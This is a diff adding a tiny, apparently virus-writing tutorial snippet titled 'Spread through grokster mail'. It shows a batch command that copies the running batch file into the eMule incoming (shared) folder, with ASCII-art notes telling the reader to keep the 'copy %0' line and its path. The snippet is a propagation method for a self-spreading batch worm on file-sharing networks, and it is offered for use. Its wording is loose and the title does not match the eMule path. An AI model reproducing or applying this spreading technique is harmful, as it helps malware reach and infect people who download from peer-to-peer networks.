@@ -1,0 +1,12 @@
+Spread through grokster mail
+
+
+
+copy %0 c:\program files\eMule\Incoming\%0
+      ^                                  ^
+      |__________________________________|                                    
+                       | 
+             These can be whatever 
+             batchfile you want them
+          to be except for the "Copy %0"
+           You need to enclude its path
